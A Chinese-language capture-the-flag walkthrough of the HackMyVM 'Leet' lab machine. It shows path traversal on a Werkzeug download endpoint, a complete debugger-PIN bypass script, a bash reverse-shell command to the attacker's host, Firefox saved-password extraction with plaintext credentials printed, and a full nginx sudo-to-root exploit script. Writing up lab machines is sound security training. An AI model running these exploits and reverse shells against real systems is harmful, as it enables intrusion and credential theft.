# hmv_Leet笔记

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet

**难度**：<span data-type="text" style="color: var(--b3-font-color8);">红色</span>

**目标 IP**：192.168.205.208
**本机 IP**：192.168.205.141

# 1.端口枚举及服务探测

使用 `nmap` 扫描目标 IP 的开放端口：

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.208
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 14:28 CST
Nmap scan report for 192.168.205.208
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)
MAC Address: 08:00:27:39:2C:58 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
```

7777 端口是 Web 服务还是 python3.11.2 的，可能是想考 SSTI，去页面看眼。

# 2.路径包含

页面是一个 L33T Converter（黑客语言转换器）

![image](https://github.com/user-attachments/assets/78a54a41-677f-4893-9236-ccbd513c99ad)

在输入框测试了 xss,ssti,sql 注入等都无果，然后发现这个下载超链接应该有点东西，谁家转换完还可以下载啊

![image](https://github.com/user-attachments/assets/014865fa-e61d-49de-ba77-da53c97db264)

看着都像一个路径包含，测试一下

![image](https://github.com/user-attachments/assets/dbda012f-0d89-4f5d-83ca-42601faaec8f)

看看有啥用户

```
┌──(kali㉿kali)-[~/test]
└─$ cat ~/Downloads/passwd|grep "bash"
root:x:0:0:root:/root:/bin/bash
riva:x:1000:1000:,,,:/home/riva:/bin/bash
```

尝试读取 `riva` 用户的 ssh 密钥，不给读

爆破一下目录包含

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://192.168.205.208:7777/download?filename=../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc=500,404 --hw=0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.208:7777/download?filename=../../../../FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000023:   200        24 L     32 W       1217 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                        
000000020:   200        24 L     32 W       1217 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" 
000000016:   200        24 L     32 W       1217 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2
                                                        e/etc/passwd"                                                   
000000135:   200        15 L     109 W      806 Ch      "/etc/fstab"                                                    
000000131:   200        22 L     190 W      1042 Ch     "/etc/crontab"                                                  
000000129:   200        18 L     105 W      1046 Ch     "/etc/apt/sources.list"                                         
000000121:   200        225 L    1107 W     7178 Ch     "/etc/apache2/apache2.conf"                                     
000000138:   200        53 L     53 W       683 Ch      "/etc/group"                                                    
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                               
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"                                              
000000206:   200        7 L      22 W       188 Ch      "../../../../../../../../../../../../etc/hosts"                 
000000205:   200        7 L      22 W       188 Ch      "/etc/hosts"                                                    
000000268:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../etc/passwd"                
000000267:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../etc/passwd"             
000000266:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../etc/passwd"          
000000265:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../etc/passwd"       
000000264:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../etc/passwd"    
000000263:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"   
000000262:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"  
000000261:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd" 
000000260:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passw
                                                        d"                                                              
000000259:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/pa
                                                        sswd"                                                           
000000258:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc
                                                        /passwd"                                                        
000000257:   200        24 L     32 W       1217 Ch     "/etc/passwd"                                                   
000000254:   200        24 L     32 W       1217 Ch     "/../../../../../../../../../../etc/passwd"                     
000000253:   200        24 L     32 W       1217 Ch     "/./././././././././././etc/passwd"                             
000000250:   200        20 L     65 W       526 Ch      "/etc/nsswitch.conf"                                            
000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                
000000246:   200        7 L      40 W       286 Ch      "/etc/motd"                                                     
000000237:   200        2 L      5 W        27 Ch       "/etc/issue"                                                    
000000236:   200        353 L    1042 W     8139 Ch     "/etc/init.d/apache2"                                           
000000269:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../../etc/passwd"                   
000000271:   200        24 L     32 W       1217 Ch     "../../../../../../../../../etc/passwd"                         
000000275:   200        24 L     32 W       1217 Ch     "../../../../../etc/passwd"                                     
000000283:   200        24 L     32 W       1217 Ch     "etc/passwd"                                                    
000000311:   200        24 L     32 W       1217 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                    
000000279:   200        24 L     32 W       1217 Ch     "../etc/passwd"                                                 
000000278:   200        24 L     32 W       1217 Ch     "../../etc/passwd"                                              
000000277:   200        24 L     32 W       1217 Ch     "../../../etc/passwd"                                           
000000274:   200        24 L     32 W       1217 Ch     "../../../../../../etc/passwd"                                  
000000276:   200        24 L     32 W       1217 Ch     "../../../../etc/passwd"                                        
000000273:   200        24 L     32 W       1217 Ch     "../../../../../../../etc/passwd"                               
000000270:   200        24 L     32 W       1217 Ch     "../../../../../../../../../../etc/passwd"                      
000000272:   200        24 L     32 W       1217 Ch     "../../../../../../../../etc/passwd"                            
000000422:   200        122 L    387 W      3208 Ch     "/etc/ssh/sshd_config"                                          
000000400:   200        41 L     120 W      911 Ch      "/etc/rpc"                                                      
000000399:   200        3 L      6 W        63 Ch       "/etc/resolv.conf"                                              
000000699:   200        0 L      1 W        292 Ch      "/var/log/lastlog"                                              
000000750:   200        0 L      1 W        1149 Ch     "/var/run/utmp"                                                 
000000741:   200        21 L     154 W      100181 Ch   "/var/log/wtmp"                                                 
000000929:   200        24 L     32 W       1217 Ch     "///////../../../etc/passwd"                                    

Total time: 3.955495
Processed Requests: 929
Filtered Requests: 878
Requests/sec.: 234.8631
```

叫 GPT 总结了一下用处

1. `/etc/passwd`：存储系统用户账户信息的文件，包括用户名、密码（通常是加密的）、用户 ID、组 ID 等。
2. `/etc/fstab`：存储文件系统信息的文件，用于在系统启动时自动挂载文件系统。
3. `/etc/crontab`：存储 cron 作业的文件，这些作业是定时执行的任务。
4. `/etc/apt/sources.list`：Debian 系 Linux 发行版（如 Ubuntu）的软件源列表文件，用于指定软件包管理器（如 APT）从哪里下载软件包。
5. `/etc/apache2/apache2.conf`：Apache HTTP 服务器的主配置文件。
6. `/etc/group`：存储系统组信息的文件，包括组名和组成员。
7. `/etc/hosts.deny`：用于指定不允许访问系统的主机和服务。
8. `/etc/hosts.allow`：用于指定允许访问系统的主机和服务。
9. `/etc/hosts`：存储本地 DNS 解析的文件，用于将主机名映射到 IP 地址。
10. `/etc/nsswitch.conf`：控制系统名称服务切换的配置文件。
11. `/etc/netconfig`：网络配置文件，包含网络服务和协议的配置信息。
12. `/etc/motd`：系统启动时显示的消息，通常是系统信息和版权声明。
13. `/etc/issue`：显示在登录提示符之前的系统信息。
14. `/etc/init.d/apache2`：Apache HTTP 服务器的初始化脚本，用于启动和停止服务。
15. `/etc/ssh/sshd_config`：SSH 守护进程的配置文件，用于控制 SSH 服务的行为。
16. `/etc/rpc`：存储 RPC 服务信息的文件。
17. `/etc/resolv.conf`：DNS 解析器配置文件，指定 DNS 服务器地址。
18. `/var/log/lastlog`：存储用户最后登录信息的日志文件。
19. `/var/run/utmp`：存储当前登录用户信息的文件。
20. `/var/log/wtmp`：存储系统登录历史记录的日志文件。

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../../etc/hosts  
127.0.0.1       localhost
127.0.1.1       leet.hmv

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

有个域名，加入我们的 hosts 中，重新访问。不能说毫不相干，只能说一模一样，那还是爆破一下网址目录吧

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://leet.hmv:7777/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://leet.hmv:7777/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 500) [Size: 14478]
/console              (Status: 200) [Size: 1563]
Progress: 7971 / 150005 (5.31%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8345 / 150005 (5.56%)
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

爆出 `/console` 我就停了，后面全是报错。访问 `/console` 他要 PIN 才可以有，用 whatweb 看看他是什么东西

```
└─$ whatweb http://leet.hmv:7777/console   
http://leet.hmv:7777/console [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.11.2], IP[192.168.205.208], Python[3.11.2], Script, Title[Console // Werkzeug Debugger], Werkzeug[3.0.1]
```

# 3.PIN获取

是 Werkzeug Debugger，使用 google 搜索看有没有漏洞可以利用，找到了一篇 [github 的文章](https://github.com/wdahlenburg/werkzeug-debug-console-bypass)符合我们的利用场景

按照他的提示利用脚本

```
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/wdahlenburg/werkzeug-debug-console-bypass.git             
正克隆到 'werkzeug-debug-console-bypass'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 27 (delta 10), reused 10 (delta 3), pack-reused 0 (from 0)
接收对象中: 100% (27/27), 8.41 KiB | 4.20 MiB/s, 完成.
处理 delta 中: 100% (10/10), 完成.
```

打开 `werkzeug-pin-bypass.py` 修改对应点

username：我刚刚尝试读他的 ssh 密钥连 `riva` 用户的都不给我读（当然没有也读不到），就只可能是 `www-data` 和 `riva` 了，但是我猜是 www-data

modname:他给的模板是 `/usr/local/lib/python3.9/site-packages/flask/app.py`，python 版本前面探测到了，是 3.11.2，通常路径只写到 3.11，所以 `/usr/local/lib/python3.11/site-packages/flask/app.py`

![image](https://github.com/user-attachments/assets/747cb5cb-511b-4a16-9338-126db5dd7ace)

（mmp，睁眼看世界）幸好报错写了，不然我猜到明年

uuid:服务器托管接口的 Mac 地址，他给的模板是 `/sys/class/net/eth0/address`，访问了，没有这个文件，应该是换了网卡，去问了问 GPT，他说可以通过 `/etc/network/interfaces` 文件了解

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../etc/network/interfaces             
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
allow-hotplug enp0s3
iface enp0s3 inet dhcp

┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../sys/class/net/enp0s3/address
08:00:27:39:2c:58
curl: (18) end of response with 4078 bytes missing

┌──(kali㉿kali)-[~/test]
└─$ python3            
Python 3.12.8 (main, Dec 13 2024, 13:19:48) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "".join("08:00:27:39:2c:58".split(":"))
'080027392c58'
>>> print(0x080027392c58)
8796751080536

```

跑一下 `/etc/machine-id`、`/proc/sys/kernel/random/boot_id`、`/proc/self/cgroup`

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../etc/machine-id        
f6791f240ce6407ea271e86b78ac3bdb
                                                                                                                                 
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../proc/sys/kernel/random/boot_id
                                                                                                                                 
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup        
 
```

/etc/machine-id：f6791f240ce6407ea271e86b78ac3bdb

/proc/sys/kernel/random/boot_id：

/proc/self/cgroup：

跑不出来，写个脚本跑跑试试，不行就去抄其他师傅的 wp[狗头]

```
#!/bin/bash

for i in {1..200}; do
  curl -s -o /tmp/response.tmp http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup
  if [ -s /tmp/response.tmp ]; then
    echo "Attempt $i: Success"
    cat /tmp/response.tmp
    break
  else
    echo "Attempt $i: Failed"
    rm -f /tmp/response.tmp
  fi
done
```

跑不出来，去 [HGBE](https://hackmyvm.eu/profile/?user=HGBE) 师傅那抄了一个

/proc/sys/kernel/random/boot_id：da68b9a7-336e-40df-879a-f38a6447bfe9

/proc/self/cgroup：0::/system.slice/flaskapp.service

根据他给的脚本获得 id

```
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ vim id.py                                                      
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ cat id.py   
machine_id = b""
for filename in "machine-id", "boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        machine_id += value
        break
try:
    with open("cgroup", "rb") as f:
        machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

print(machine_id)
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ echo "f6791f240ce6407ea271e86b78ac3bdb" > machine-id
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ echo "da68b9a7-336e-40df-879a-f38a6447bfe9" > boot_id
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ echo "0::/system.slice/flaskapp.service" > cgroup  
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ chmod +x id.py  
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ python3 id.py    
b'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
```

整个代码改完是这样的

```
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ cat werkzeug-pin-bypass.py  
  
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
        'www-data',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/opt/project/venv/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
        '8796751080536',# str(uuid.getnode()),  /sys/class/net/ens33/address 
        # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
        'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print("Pin: " + rv)
```

运行 werkzeug-pin-bypass.py 获得 PIN

```
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ python3 werkzeug-pin-bypass.py
Pin: 113-565-783
```

成功登入，有点尴尬哈，不是 ssti，只是单纯的 python

```
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp  #开个监听
```

```
>>> import os
>>> os.system("id")
0
>>> os.system("ping -c2 192.168.205.141")
```

他回显个 0，ping 一下看有没有包

```
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp                    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:30:30.290786 IP 192.168.205.208 > 192.168.205.141: ICMP echo request, id 30409, seq 1, length 64
E..T..@.@.Q_............v.....og....g<...................... !"#$%&'()*+,-./01234567
16:30:30.290806 IP 192.168.205.141 > 192.168.205.208: ICMP echo reply, id 30409, seq 1, length 64
E..T....@.W;............v.....og....g<...................... !"#$%&'()*+,-./01234567
16:30:31.313700 IP 192.168.205.208 > 192.168.205.141: ICMP echo request, id 30409, seq 2, length 64
E..T..@.@.P...........V.v.....og............................ !"#$%&'()*+,-./01234567
16:30:31.313721 IP 192.168.205.141 > 192.168.205.208: ICMP echo reply, id 30409, seq 2, length 64
E..T....@.W...........^.v.....og............................ !"#$%&'()*+,-./01234567

```

有包，弹个 shell 回来

```
>>> os.system("bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'")
```

# 4. 提权

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.208] 40200
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
www-data@leet:/opt/project$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@leet:/opt/project$ sudo -l
sudo -l
Matching Defaults entries for www-data on leet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on leet:
    (riva) NOPASSWD: /usr/bin/micro

```

可以用 `riva` 执行 `/usr/bin/micro` 使用 [gtfobins](https://gtfobins.github.io/) 搜索没有结果，那我们看看他帮助吧

```
www-data@leet:/opt/project$ /usr/bin/micro -h
Usage: micro [OPTIONS] [FILE]...
-clean
        Cleans the configuration directory
-config-dir dir
        Specify a custom location for the configuration directory
[FILE]:LINE:COL (if the `parsecursor` option is enabled)
+LINE:COL
        Specify a line and column to start the cursor at when opening a buffer
-options
        Show all option help
-debug
        Enable debug mode (enables logging to ./log.txt)
-version
        Show the version number and information

Micro's plugin's can be managed at the command line with the following commands.
-plugin install [PLUGIN]...
        Install plugin(s)
-plugin remove [PLUGIN]...
        Remove plugin(s)
-plugin update [PLUGIN]...
        Update plugin(s) (if no argument is given, updates all plugins)
-plugin search [PLUGIN]...
        Search for a plugin
-plugin list
        List installed plugins
-plugin available
        List available plugins

Micro's options can also be set via command line arguments for quick
adjustments. For real configuration, please use the settings.json
file (see 'help options').

-option value
        Set `option` to `value` for this session
        For example: `micro -syntax off file.c`

Use `micro -options` to see the full list of configuration options

```

没什么有用的信息，运行一下看看是什么

```
ww-data@leet:/var/www/html$ sudo -u riva /usr/bin/micro
```

![image](https://github.com/user-attachments/assets/bc8598d6-1641-4cb9-8c63-ace450ad38f9)

和 vim 类似文本编辑器，搜索一下有没有命令行

![image](https://github.com/user-attachments/assets/5b94dfee-41c9-4dc7-95d7-7e66d2a3aa09)

```
ctrl+b 
$ /bin/bash
riva@leet:/var/www/html$ 
```

成功进来，看了一圈都没有什么发现,把 linpeas.sh 传上去看看，也是没看到什么重要的东西，去看了 [HGBE](https://hackmyvm.eu/profile/?user=HGBE) 的 wp，发现是我不够大胆，反正我想不到从 firefox 提取密码

[Firefox Decrypt](https://github.com/unode/firefox_decrypt)

```
riva@leet:~$ python3 firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -> zbznfk37.default
2 -> guu30cui.default-esr
2

Website:   chrome://FirefoxAccounts
Username: '1db9561103ca4adc9afa6357c0a0b554'
Password: '{"version":1,"accountData":{"scopedKeys":{"https://identity.mozilla.com/apps/oldsync":{"kid":"1603273389635-IxsZ6HpGK9fL9tUfdcBqwA","k":"Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg","kty":"oct"},"sync:addon_storage":{"kid":"1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U","k":"L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA","kty":"oct"}},"kSync":"43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6","kXCS":"231b19e87a462bd7cbf6d51f75c06ac0","kExtSync":"2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608","kExtKbHash":"360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85"}}'

Website:   http://leet.hmv
Username: 'riva'
Password: 'PGH$2r0co3L5QL'

Website:   https://hackmyvm.eu
Username: 'riva'
Password: 'lovelove80'

riva@leet:~$ sudo -l
[sudo] password for riva: 
Matching Defaults entries for riva on leet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User riva may run the following commands on leet:
    (root) /usr/sbin/nginx
```

然后就是我们的老伙计上场了，nginx [提权方法](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)

```
riva@leet:~$ cat exploit.sh

echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"


riva@leet:~$ bash exploit.sh 
riva@leet:~/.ssh$ ssh -i id_rsa root@127.0.0.1
root@leet:~#  id
uid=0(root) gid=0(root) groups=0(root)

```